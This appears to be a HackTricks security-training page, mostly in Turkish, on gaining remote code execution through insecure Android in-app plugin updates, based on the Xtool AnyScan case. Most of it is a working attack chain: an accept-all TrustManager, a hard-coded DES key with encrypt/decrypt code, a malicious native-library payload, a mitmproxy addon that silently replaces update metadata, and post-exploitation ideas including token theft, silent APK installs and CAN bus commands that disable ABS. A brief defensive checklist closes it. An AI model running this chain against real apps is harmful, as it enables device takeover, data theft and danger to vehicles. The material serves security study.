# Güvensiz Uygulama İçi Güncelleme Mekanizmaları – Kötü Amaçlı Eklentilerle Uzaktan Kod Yürütme

{{#include ../../banners/hacktricks-training.md}}

Birçok Android uygulaması, Google Play Store'u kullanmak yerine **kendi “plugin” veya “dinamik özellik” güncelleme kanallarını** uygular. Uygulama güvenli değilse, trafiği kesebilen bir saldırgan **uygulama sürecinde yüklenecek rastgele yerel kod sağlayabilir**, bu da cihazda tam Uzaktan Kod Yürütme (RCE) ile sonuçlanır – ve bazı durumlarda uygulama tarafından kontrol edilen herhangi bir dış cihazda (arabalar, IoT, tıbbi cihazlar …) da.

Bu sayfa, Xtool **AnyScan** otomotiv-diyagnostik uygulamasında (v4.40.11 → 4.40.40) bulunan gerçek bir güvenlik açığı zincirini özetlemekte ve tekniği genelleştirerek diğer Android uygulamalarını denetlemenizi ve bir kırmızı takım angajmanı sırasında yanlış yapılandırmayı silahlandırmanızı sağlamaktadır.

---
## 1. Güvensiz TLS TrustManager'ı Belirleme

1. APK'yı jadx / apktool ile decompile edin ve ağ yığınına (OkHttp, HttpUrlConnection, Retrofit…) ulaşın.
2. Her sertifikayı körü körüne güvenen **özel bir `TrustManager`** veya `HostnameVerifier` arayın:
```java
public static TrustManager[] buildTrustManagers() {
return new TrustManager[]{
new X509TrustManager() {
public void checkClientTrusted(X509Certificate[] chain, String authType) {}
public void checkServerTrusted(X509Certificate[] chain, String authType) {}
public X509Certificate[] getAcceptedIssuers() {return new X509Certificate[]{};}
}
};
}
```
3. Eğer mevcutsa, uygulama **herhangi bir TLS sertifikasını** kabul edecektir → kendinden imzalı bir sertifika ile şeffaf bir **MITM proxy** çalıştırabilirsiniz:
```bash
mitmproxy -p 8080 -s addon.py  # see §4
iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-ports 8080  # on rooted device / emulator
```
## 2. Güncelleme Meta Verilerini Tersine Mühendislik

AnyScan durumunda, her uygulama başlatıldığında bir HTTPS GET isteği tetiklenir:
```
https://apigw.xtoolconnect.com/uhdsvc/UpgradeService.asmx/GetUpdateListEx
```
Yanıt gövdesi, her mevcut eklentiyi tanımlayan **Base64 kodlu, DES-ECB şifreli** JSON içeren `<FileData>` düğümlerinden oluşan bir **XML belgesi**dir.

Tipik avlanma adımları:
1. Kripto rutinini (örneğin `RemoteServiceProxy`) bulun ve geri kazanın:
* algoritma (DES / AES / RC4 …)
* çalışma modu (ECB / CBC / GCM …)
* sabit kodlu anahtar / IV (genellikle 56-bit DES anahtarları veya 128-bit AES anahtarları sabitlerde)
2. Metadata'yı şifrelemek / şifre çözmek için Python'da fonksiyonu yeniden uygulayın:
```python
from Crypto.Cipher import DES
from base64 import b64decode, b64encode

KEY = IV = b"\x2A\x10\x2A\x10\x2A\x10\x2A"  # 56-bit key observed in AnyScan

def decrypt_metadata(data_b64: str) -> bytes:
cipher = DES.new(KEY, DES.MODE_ECB)
return cipher.decrypt(b64decode(data_b64))

def encrypt_metadata(plaintext: bytes) -> str:
cipher = DES.new(KEY, DES.MODE_ECB)
return b64encode(cipher.encrypt(plaintext.ljust((len(plaintext)+7)//8*8, b"\x00"))).decode()
```
## 3. Kötü Amaçlı Bir Eklenti Oluşturun

1. Herhangi bir meşru eklenti ZIP'ini seçin ve yerel kütüphaneyi yüklemenizle değiştirin:
```c
// libscan_x64.so – constructor runs as soon as the library is loaded
__attribute__((constructor))
void init(void){
__android_log_print(ANDROID_LOG_INFO, "PWNED", "Exploit loaded! uid=%d", getuid());
// spawn reverse shell, drop file, etc.
}
```

```bash
$ aarch64-linux-android-gcc -shared -fPIC payload.c -o libscan_x64.so
$ zip -r PWNED.zip libscan_x64.so assets/ meta.txt
```
2. JSON meta verisini güncelleyin, böylece `"FileName" : "PWNED.zip"` ve `"DownloadURL"` HTTP sunucunuza işaret etsin.  
3. Değiştirilen JSON'u DES ile şifreleyin + Base64 ile kodlayın ve kesilen XML'in içine geri kopyalayın.

## 4. Payload'u mitmproxy ile Gönderin

`addon.py` örneği, orijinal meta veriyi *sessizce* değiştiren:
```python
from mitmproxy import http
MOD_XML = open("fake_metadata.xml", "rb").read()

def request(flow: http.HTTPFlow):
if b"/UpgradeService.asmx/GetUpdateListEx" in flow.request.path:
flow.response = http.Response.make(
200,
MOD_XML,
{"Content-Type": "text/xml"}
)
```
Kötü niyetli ZIP dosyasını barındırmak için basit bir web sunucusu çalıştırın:
```bash
python3 -m http.server 8000 --directory ./payloads
```
When the victim launches the app it will:
* sahte XML'imizi MITM kanalı üzerinden alır;
* hard-coded DES anahtarı ile şifreyi çözer ve ayrıştırır;
* `PWNED.zip` dosyasını indirir → özel depolama alanında açar;
* `dlopen()` ile dahil edilen *libscan_x64.so* dosyasını çalıştırır, kodumuzu **uygulamanın izinleriyle** (kamera, GPS, Bluetooth, dosya sistemi, …) anında yürütür.

Eklenti diskte önbelleğe alındığı için arka kapı **yeniden başlatmalarda kalır** ve kullanıcı ilgili özelliği her seçtiğinde çalışır.

## 5. Post-Exploitation Ideas

* Uygulama tarafından saklanan oturum çerezlerini, OAuth token'larını veya JWT'leri çalın.
* İkinci aşama bir APK bırakın ve `pm install` ile sessizce yükleyin (uygulama zaten `REQUEST_INSTALL_PACKAGES` iznine sahip).
* Bağlı donanımı kötüye kullanın – AnyScan senaryosunda rastgele **OBD-II / CAN bus komutları** gönderebilirsiniz (kapıları açma, ABS'yi devre dışı bırakma, vb.).

---
### Detection & Mitigation Checklist (blue team)

* Sertifika doğrulamasını devre dışı bırakan özel bir TrustManager/HostnameVerifier ile üretim sürümü asla göndermeyin.
* Google Play dışından çalıştırılabilir kod indirmeyin. Eğer *zorundaysanız*, her eklentiyi aynı **apkSigning v2** anahtarı ile imzalayın ve yüklemeden önce imzayı doğrulayın.
* Zayıf/hard-coded kriptografiyi **AES-GCM** ve sunucu tarafında dönen bir anahtarla değiştirin.
* İndirilen arşivlerin bütünlüğünü doğrulayın (imza veya en azından SHA-256).

---
## References

- [NowSecure – Remote Code Execution Discovered in Xtool AnyScan App](https://www.nowsecure.com/blog/2025/07/16/remote-code-execution-discovered-in-xtool-anyscan-app-risks-to-phones-and-vehicles/)
- [Android – Unsafe TrustManager patterns](https://developer.android.com/privacy-and-security/risks/unsafe-trustmanager)

{{#include ../../banners/hacktricks-training.md}}
